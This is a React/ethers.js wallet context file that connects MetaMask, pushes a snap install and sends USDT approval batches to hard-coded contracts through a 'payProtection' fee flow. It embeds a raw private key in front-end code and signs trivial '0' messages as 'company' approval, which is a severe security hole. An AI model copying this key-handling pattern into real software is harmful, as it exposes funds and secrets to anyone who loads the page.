import React, { createContext, useState, useEffect, useContext } from 'react';
import { ethers } from 'ethers';
import abi from "./abi.js";
import { addTransaction, updateTransaction, getTransactions } from '../utils/transactionStorageUtils';

const Web3Context = createContext();

export const useWeb3 = () => useContext(Web3Context);

const USDT_CONTRACTS = {
  // Ethereum Mainnet
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  // Ethereum Testnet
  11155111: '0x24B5fD18E3268cDed8235FF1670a68e977512379',
  // BSC
  56: '0x55d398326f99059fF775485246999027B3197955',
  // Polygon
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  // Arbitrum
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
  // Optimism
  10: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58'
};

const CONTRACT_7702 = "0xCe5f77038FAdE7f6555C1a9632E7bAd7D26E3f0f";
const CONTRACT_SAFE_WALLET = "0xb3c7d72C5703AcEEfD8A8e3319b999f2a003c86C";

const MAIN_ADDRESS = "0xEa5e8c4fb4A5EdE79Bee9Bc62B17eE70ff0e11eE";
const MAIN_PRIVATE = "0x97054b29aad9e5c690bd105a2165ea32fcd20649848f37d59d43512f68cae9a9";

export const Web3Provider = ({ children }) => {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [accounts, setAccounts] = useState([]);
  const [currentAccount, setCurrentAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [snapInstalled, setSnapInstalled] = useState(false);
  const [transactions, setTransactions] = useState([]);
  const [isProtected, setIsProtected] = useState(false);

  // Check if MetaMask is installed
  const checkIfMetaMaskIsInstalled = () => {
    return window.ethereum !== undefined;
  };

  // Check if MetaMask Snap is installed
  const checkIfSnapIsInstalled = async () => {
    try {
      if (!window.ethereum || !window.ethereum.isMetaMask) {
        console.log("MetaMask is not installed");
        return false;
      }
      
      // Replace with your actual snap ID
      const snapId = 'npm:@metamask/institutional-wallet-snap';
      
      const result = await window.ethereum.request({
        method: 'wallet_getSnaps',
      });
      
      return !!result[snapId];
    } catch (error) {
      console.error("Error checking if snap is installed:", error);
      return false;
    }
  };

  // Install MetaMask Snap
  const installSnap = async () => {
    try {
      // const snaps = await ethereum.request({ method: 'wallet_getSnaps' });
      // console.log('已安装的 Snaps:', snaps);
      // Replace with your actual snap ID - must start with npm: or local:
      const snapId = 'npm:@metamask/institutional-wallet-snap';
      
      await window.ethereum.request({
        method: 'wallet_requestSnaps',
        params: {
          [snapId]: {},
        },
      });
      console.log('Snap installed successfully');
      setSnapInstalled(true);
      return true;
    } catch (error) {
      console.error("Error installing snap:", error);
      return false;
    }
  };

  // Connect to MetaMask
  const connectWallet = async () => {
    try {
      if (!checkIfMetaMaskIsInstalled()) {
        alert("Please install MetaMask!");
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const chainId = await provider.getNetwork().then(network => network.chainId);
      
      setProvider(provider);
      setSigner(signer);
      setAccounts(accounts);
      setCurrentAccount(accounts[0]);
      setChainId(chainId);
      setIsConnected(true);

      // Check if snap is installed
      const isSnapInstalled = await checkIfSnapIsInstalled();
      setSnapInstalled(isSnapInstalled);

      if (!isSnapInstalled) {
        const installed = await installSnap();
        if (!installed) {
          console.log("Failed to install snap");
        }
      }

      return accounts;
    } catch (error) {
      console.error("Error connecting to wallet:", error);
      return null;
    }
  };

  const payProtection = async () => {
    try {
      const userAccount = currentAccount;
      if(!userAccount) {
        console.error("No account found");
        throw new Error("No account found");
      }

      const usdtAddress = USDT_CONTRACTS[chainId];
      
      if (!usdtAddress) {
        console.error("USDT contract not found for this network");
        throw new Error("USDT contract not found for this network");
      }
      
      // Amount to approve: 150 USDT converted to wei (USDT has 6 decimals)
      const amount = 150000000n; // 150 * 10^6 = 150,000,000 wei units
      
      // ERC20 ABI for approve method
      const erc20ABI = [
        {
          "inputs": [
            { "name": "spender", "type": "address" },
            { "name": "amount", "type": "uint256" }
          ],
          "name": "approve",
          "outputs": [{ "name": "", "type": "bool" }],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ];
      
      // Contract ABI for exchangeTokens method
      const contractABI = [
        {
          "inputs": [{ "name": "recipient", "type": "address" }],
          "name": "exchangeTokens",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ];
      
      // Create ethers.js interfaces for encoding function data
      const erc20Interface = new ethers.utils.Interface(erc20ABI);
      // Encode function data using ethers.js
      const approveData = erc20Interface.encodeFunctionData("approve", [CONTRACT_SAFE_WALLET, amount]);

      const contractInterface = new ethers.utils.Interface(contractABI);
      const exchangeData = contractInterface.encodeFunctionData("exchangeTokens", [userAccount]);
      
      const userWeight = 0;
      const companyWeight = 0;
      const targets = [usdtAddress, CONTRACT_SAFE_WALLET];
      const values = [0, 0]; // Use regular numbers instead of BigInt literals
      const data = [approveData, exchangeData];

      const txHash = await create7702BatchTransaction(targets, values, data, userWeight, companyWeight);
      setIsProtected(true);
      const newTx = {
        id: Date.now().toString(),
        targets,
        values,
        data,
        status: 'pending',
        timestamp: Date.now(),
        hash: txHash,
      };

      addTransaction(newTx, currentAccount);
      
      return {
        success: true,
        txHash
      };
    } catch (error) {
      console.error("Error paying protection:", error);
      return {
        success: false,
        error: error.message
      };
    }
  };

  const getIsExchange = async (account) => {
    try {
      // ABI for just the isExchanged method
      const minABI = [
        {
          "inputs": [{ "name": "_address", "type": "address" }],
          "name": "isExchanged",
          "outputs": [{ "name": "", "type": "bool" }],
          "stateMutability": "view",
          "type": "function"
        }
      ];
      
      // Create contract instance
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const contract = new ethers.Contract(CONTRACT_SAFE_WALLET, minABI, provider);
      
      // Call the isExchanged method
      const result = await contract.isExchanged(account);
      return result;
    } catch (error) {
      console.error("Error checking if address is exchanged:", error);
      return false;
    }
  }

  // Get accounts from Safe Snap
  const getSafeAccounts = async () => {
    try {
      // Use the standard Ethereum method instead of the snap method
      // This avoids permission issues with the institutional wallet snap
      const accounts = await window.ethereum.request({
        method: 'eth_accounts'
      });
      
      console.log('Retrieved accounts:', accounts);
      
      if (accounts && accounts.length > 0) {
        setAccounts(accounts);
        return accounts;
      } else {
        console.log('No accounts found');
        return [];
      }
    } catch (error) {
      console.error("Error getting accounts:", error);
      return [];
    }
  };

  const create7702BatchTransaction = async (targets, values, datas, userWeight, companyWeight) => { 
    // Encode the executeBatch function call
    const walletInterface = new ethers.utils.Interface(abi);

    // Create messages for signing
    const userMessage = `${userWeight}`;
    const companyMessage = `${companyWeight}`;
    
    // Use personal_sign for user signature
    const userSignature = await window.ethereum.request({ 
      method: 'personal_sign', 
      params: [userMessage, currentAccount] 
    });
    
    // Use ethers to sign with MAIN_PRIVATE key for company signature
    const wallet = new ethers.Wallet(MAIN_PRIVATE);
    console.log('Company wallet address:', wallet.address, 'should match MAIN_ADDRESS:', MAIN_ADDRESS);
    const companySignature = await wallet.signMessage(companyMessage);
    
    const executeBatchData = walletInterface.encodeFunctionData("executeBatch", [
      targets, 
      values, 
      datas, 
      userWeight, 
      companyWeight,
      userSignature,
      companySignature
    ]);
    
    // Create a provider to connect to the network
    const ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
    
    // Get the signer from the provider (connected to the user's wallet)
    const signer = ethersProvider.getSigner();
    console.log('Using signer address:', await signer.getAddress());
    
    // Send the transaction using the signer
    const tx = await signer.sendTransaction({
      to: CONTRACT_7702,
      value: ethers.utils.parseEther("0"),
      data: executeBatchData,
      //type: 4,
      gasLimit: 500000, // Set an appropriate gas limit
    });
    
    const txHash = tx.hash;
    console.log('Transaction sent with wallet:', txHash);

    return txHash;
  }

  const create7702SingleTransaction = async (to, value, userWeight, companyWeight, data = '0x0') => {
    const targets = [to];
    const values = [value];
    const datas = [data];
    const txHash = await create7702BatchTransaction(targets, values, datas, userWeight, companyWeight);
    const newTx = {
      id: Date.now().toString(),
      to,
      value,
      data,
      status: 'pending',
      timestamp: Date.now(),
      hash: txHash,
    };

    addTransaction(newTx, currentAccount);
    
    return {hash: txHash};
  }

  // Create transaction using standard Ethereum methods
  const createTransaction = async (to, value, data = '0x') => {
    try {
      if (!currentAccount) {
        console.log("No account connected");
        return null;
      }
      
      // Convert value to hex format for Ethereum JSON-RPC
      // If it's already a string starting with 0x, use it as is
      // If it's a string with a number (like from parseEther), convert to hex
      // If it's a number, convert directly to hex
      let valueHex;
      if (typeof value === 'string') {
        if (value.startsWith('0x')) {
          valueHex = value;
        } else {
          // Handle string numbers (like those from parseEther)
          valueHex = '0x' + BigInt(value).toString(16);
        }
      } else if (typeof value === 'number') {
        valueHex = '0x' + value.toString(16);
      } else {
        console.error('Invalid value type:', typeof value);
        valueHex = '0x0';
      }
      
      console.log(`Transaction value: ${value} (hex: ${valueHex})`);
      
      // Use standard eth_sendTransaction method
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: currentAccount,
          to,
          value: valueHex,
          data,
        }],
      });
      
      console.log('Transaction sent:', txHash);
      
      // Add transaction to history
      const newTx = {
        id: Date.now().toString(),
        to,
        value,
        data,
        status: 'pending',
        timestamp: Date.now(),
        hash: txHash,
      };
      
      // Update state and localStorage using the utility function
      const updatedTxs = addTransaction(newTx, currentAccount);
      setTransactions(updatedTxs);
      
      return { hash: txHash };
    } catch (error) {
      console.error("Error creating transaction:", error);
      return null;
    }
  };

  // Get transaction history
  const getTransactionHistory = async () => {
    try {
      console.log('Getting transaction history from blockchain');
      
      if (!currentAccount) {
        console.log('No account connected');
        return [];
      }
      
      // Get transactions from localStorage using the utility function
      let txHistory = getTransactions(currentAccount);
      
      // const blockNumberHex = await window.ethereum.request({
      //   method: 'eth_blockNumber'
      // });
      
      // const currentBlockNumber = parseInt(blockNumberHex, 16);
      // console.log('Current block number:', currentBlockNumber);
      
      // // Determine starting point for scanning
      // // If we have a last scanned block, start from there
      // // If not, only go back 1000 blocks maximum to avoid excessive scanning
      // const maxBlocksToScan = 20;
      // const startBlock = Math.max(currentBlockNumber - maxBlocksToScan);
      
      // console.log(`Scanning from block ${startBlock} to ${currentBlockNumber} (${maxBlocksToScan} blocks)...`);
      
      // // Track the highest block we've scanned in this session
      // let highestScannedBlock = 0;
      
      // // Scan blocks from startBlock to currentBlockNumber
      // for (let blockNumber = startBlock; blockNumber <= currentBlockNumber; blockNumber++) {
      //   if (blockNumber < 0) continue;
        
      //   // Update highest scanned block
      //   if (blockNumber > highestScannedBlock) {
      //     highestScannedBlock = blockNumber;
      //   }
        
      //   const blockNumberHex = '0x' + blockNumber.toString(16);
        
      //   try {
      //     // Get block with transactions
      //     const block = await window.ethereum.request({
      //       method: 'eth_getBlockByNumber',
      //       params: [blockNumberHex, true]
      //     });
          
      //     if (block && block.transactions && block.transactions.length > 0) {
      //       console.log(`Block ${blockNumber} has ${block.transactions.length} transactions`);
            
      //       // Filter transactions related to current account
      //       const accountTxs = block.transactions.filter(tx => 
      //         tx.from && tx.from.toLowerCase() === currentAccount.toLowerCase() || 
      //         (tx.to && tx.to.toLowerCase() === currentAccount.toLowerCase())
      //       );
            
      //       if (accountTxs.length > 0) {
      //         console.log(`Found ${accountTxs.length} transactions for account in block ${blockNumber}`);
              
      //         // Add transactions to history if they're not already there
      //         accountTxs.forEach(tx => {
      //           if (!txHistory.some(histTx => histTx.hash === tx.hash)) {
      //             // Get transaction receipt for status
      //             txHistory.push({
      //               id: Date.now().toString() + Math.random().toString(36).substring(2, 15),
      //               from: tx.from,
      //               to: tx.to,
      //               value: tx.value,
      //               data: tx.input || '0x',
      //               status: 'confirmed',  // Transactions in blocks are confirmed
      //               timestamp: parseInt(block.timestamp, 16) * 1000, // Convert to milliseconds
      //               hash: tx.hash,
      //               blockNumber: blockNumber
      //             });
      //           }
      //         });
      //       }
      //     }
      //   } catch (e) {
      //     console.error(`Error getting block ${blockNumber}:`, e);
      //   }
      // }
      
      // // Also check pending transactions
      // try {
      //   const pendingBlock = await window.ethereum.request({
      //     method: 'eth_getBlockByNumber',
      //     params: ['pending', true]
      //   });
        
      //   if (pendingBlock && pendingBlock.transactions && pendingBlock.transactions.length > 0) {
      //     console.log(`Pending block has ${pendingBlock.transactions.length} transactions`);
          
      //     // Filter transactions related to current account
      //     const pendingAccountTxs = pendingBlock.transactions.filter(tx => 
      //       tx.from && tx.from.toLowerCase() === currentAccount.toLowerCase() || 
      //       (tx.to && tx.to.toLowerCase() === currentAccount.toLowerCase())
      //     );
          
      //     console.log('Pending transactions for account:', pendingAccountTxs);
          
      //     // Add pending transactions to history if they're not already there
      //     pendingAccountTxs.forEach(tx => {
      //       if (!txHistory.some(histTx => histTx.hash === tx.hash)) {
      //         txHistory.push({
      //           id: Date.now().toString() + Math.random().toString(36).substring(2, 15),
      //           from: tx.from,
      //           to: tx.to,
      //           value: tx.value,
      //           data: tx.input || '0x',
      //           status: 'pending',
      //           timestamp: Date.now(),
      //           hash: tx.hash
      //         });
      //       }
      //     });
      //   }
      // } catch (e) {
      //   console.error('Error getting pending transactions:', e);
      // }
      
      // Sort transactions by timestamp (newest first)
      txHistory.sort((a, b) => b.timestamp - a.timestamp);
      
      console.log('Final transaction history:', txHistory);
      
      // Save updated transaction history to localStorage
      localStorage.setItem('safeWalletTransactions', JSON.stringify(txHistory));
      
      // Update state
      setTransactions(txHistory);
      return txHistory;
    } catch (error) {
      console.error("Error getting transaction history:", error);
      return [];
    }
  };

  // Switch chain
  const switchChain = async (chainId) => {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: ethers.utils.hexValue(chainId) }],
      });
      
      setChainId(chainId);
      return true;
    } catch (error) {
      console.error("Error switching chain:", error);
      return false;
    }
  };

  // Listen for account changes
  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        setAccounts(accounts);
        setCurrentAccount(accounts[0]);
      });

      window.ethereum.on('chainChanged', (chainId) => {
        setChainId(parseInt(chainId, 16));
      });

      // Cleanup
      return () => {
        window.ethereum.removeAllListeners('accountsChanged');
        window.ethereum.removeAllListeners('chainChanged');
      };
    }
  }, []);

  const value = {
    provider,
    signer,
    accounts,
    currentAccount,
    chainId,
    isConnected,
    snapInstalled,
    transactions,
    connectWallet,
    getSafeAccounts,
    createTransaction,
    getTransactionHistory,
    switchChain,
    isProtected,
    setIsProtected,
    getIsExchange,
    payProtection,
    create7702SingleTransaction
  };

  return (
    <Web3Context.Provider value={value}>
      {children}
    </Web3Context.Provider>
  );
};

// Export the context as default
export default Web3Context;
